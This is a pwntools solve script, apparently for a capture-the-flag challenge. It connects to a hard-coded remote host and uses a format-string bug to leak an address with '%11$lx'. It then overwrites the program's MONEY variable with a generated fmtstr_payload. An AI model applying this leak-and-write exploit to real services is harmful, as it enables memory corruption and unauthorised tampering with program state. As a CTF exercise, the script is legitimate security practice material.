#!/usr/bin/env python3

from pwn import *

HOST = "143.198.184.186"
PORT = 5001

exe = ELF("./brokecollegestudents")
CATCH_RET_ADDR = 0x188c

context.binary = exe
context.log_level = "debug"

def conn():
    #if args.LOCAL:
    #    return process([exe.path])
    #else:
        return remote(HOST, PORT)


def exec_fmt(p, payload):
    p.sendline(b'1')
    p.sendline(b'1')
    while True:
        p.recvuntil(b'CHOOSE: ')
        p.sendline(b'1')
        if b'YOU GOT IT!' in p.recvline():
            break
        
    p.recvuntil(b'name: ')
    p.sendline(payload)
    p.recvline()
    p.recvline()
    return p.recvuntil(b'What', drop=True)


def main():
    p = conn()
    binary_leak = int(exec_fmt(p, '%11$lx').strip(), 16) - CATCH_RET_ADDR

    autofmt = fmtstr_payload(6, {binary_leak+exe.symbols['MONEY']+3: 1}, write_size='byte')
    exec_fmt(p, autofmt)

    p.sendline(b'2')
    p.sendline(b'2')
    p.sendline(b'3')
    p.recvuntil(b'(0 to cancel): ')
    print(p.recvline())

if __name__ == '__main__':
    main()
